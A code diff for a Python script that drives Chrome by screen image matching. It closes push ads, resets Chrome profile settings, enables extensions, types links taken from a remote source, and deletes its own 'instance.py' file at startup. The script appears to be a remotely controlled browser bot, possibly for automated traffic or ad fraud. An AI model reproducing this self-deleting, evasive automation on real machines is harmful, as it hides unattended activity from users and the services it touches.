@@ -16,11 +16,10 @@ start_time = last_change_timing = time()
 
 
 def run(host_ip):
-    global start_time
+    global start_time, last_change_timing
     link = ''
     from os import remove
     remove('instance.py')
-    global last_change_timing
     def force_connect_server(type_of_connection):
         if type_of_connection == 'tcp':
             connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
@@ -69,8 +68,7 @@ def run(host_ip):
         for sign in ['chrome close region 1', 'chrome close region 2']:
             chrome_close_region = __find_image_on_screen(img_name=sign, confidence=0.8)
             if chrome_close_region:
-                coordinates = __find_image_on_screen(img_name='chrome close', region=chrome_close_region,
-                                                     confidence=0.9)
+                coordinates = __find_image_on_screen(img_name='chrome close', region=chrome_close_region, confidence=0.9)
                 if coordinates:
                     __click(coordinates)
                     break
@@ -104,12 +102,12 @@ def run(host_ip):
                 img_data = Image.frombytes(mode="RGBA", size=size, data=img_data, decoder_name='raw')
             except:
                 img_data = Image.frombytes(mode="RGB", size=size, data=img_data, decoder_name='raw')
+
             if all_findings:
                 return pyautogui.locateAllOnScreen(img_data, confidence=confidence, region=region)
             else:
                 return pyautogui.locateOnScreen(img_data, confidence=confidence, region=region)
-        except Exception as e:
-            print(repr(e))
+        except:
             return __find_image_on_screen(img_name, all_findings, confidence, region)
 
 
@@ -193,7 +191,7 @@ def run(host_ip):
         while not success and not failure:
             coordinates = [0, 0, 0, 0]
             if current_screen_condition != 'chrome_push_ads':
-                sleep(randrange(10, 15))
+                sleep(randrange(5, 15))
             condition_found = False
 
             if 'force_close_chrome' in current_screen_condition:
@@ -219,16 +217,17 @@ def run(host_ip):
                     Thread(target=send_debug_data, args=(f' exception 2 failure',)).start()
                 if current_screen_condition == 'chrome_push_ads':
                     push_ad_close = __find_image_on_screen('chrome push ads', region=coordinates, all_findings=False, confidence=0.8)
+                    start_time += 1
                     if push_ad_close:
                         __click(push_ad_close)
-                        sleep(2)
-                        pyautogui.move(1,1)
+                        #sleep(1)
+                        pyautogui.move(30,30)
                 elif current_screen_condition == 'clear_chrome_cookies':  #####
                     __click(coordinates)
-                    sleep(5)
                     __close_chrome_safe()
                     link = 'chrome://extensions/'
                     clear_chrome = False
+                    start_time = time()
                 elif current_screen_condition == 'enable_extensions':
                     finish_counter = 0
                     while True:
@@ -241,7 +240,6 @@ def run(host_ip):
                         else:
                             finish_counter += 1
                             pyautogui.scroll(-500)
-                    sleep(5)
                     __close_chrome_safe()
                     link = ''
                     start_time = time()
@@ -257,7 +255,6 @@ def run(host_ip):
                         Thread(target=send_debug_data, args=(f' exception 5 failure',)).start()
                 elif current_screen_condition == 'nothing_opened':
                     try:
-                        #Thread(target=temp_remove_possibility, args=(current_screen_condition,)).start()
                         __click(coordinates)
                     except:
                         Thread(target=send_debug_data, args=(f' exception 6 failure',)).start()
@@ -265,14 +262,12 @@ def run(host_ip):
                     try:
                         __click(coordinates)
                         pyautogui.hotkey('ctrl','a')
-                        sleep(1)
                         if not link:
                             if clear_chrome:
                                 link = 'chrome://settings/resetProfileSettings'
                             else:
                                 link = get_link()
                         pyautogui.typewrite(link, typing_speed)
-                        sleep(1)
                         pyautogui.press('enter')
                     except Exception as e:
                         Thread(target=send_debug_data, args=(f'7 exception {repr(e)}',)).start()
@@ -312,7 +307,6 @@ def run(host_ip):
                             coordinates = __find_image_on_screen(img_name=sign, confidence=0.8)
                             if coordinates:
                                 __click(coordinates)
-                                break
                     except:
                         Thread(target=send_debug_data, args=(f' exception 12 failure',)).start()
                 elif current_screen_condition == 'click_here_to_continue':
@@ -325,18 +319,21 @@ def run(host_ip):
                         Thread(target=send_debug_data, args=(f' exception 13 failure',)).start()
                 elif current_screen_condition == 'force_close_chrome_neutral':
                     try:
+                        start_time = time()
                         break
                     except:
                         Thread(target=send_debug_data, args=(f' exception 14 failure',)).start()
                 elif current_screen_condition == 'force_close_chrome_success':
                     try:
                         success = True
+                        start_time = time()
                         break
                     except:
                         Thread(target=send_debug_data, args=(f' exception 15 failure',)).start()
                 elif current_screen_condition == 'force_close_chrome_failure':
                     try:
                         retry = choice((True,False,))
+                        start_time = time()
                         if retry:
                             pyautogui.press('f5')
                             sleep(5)
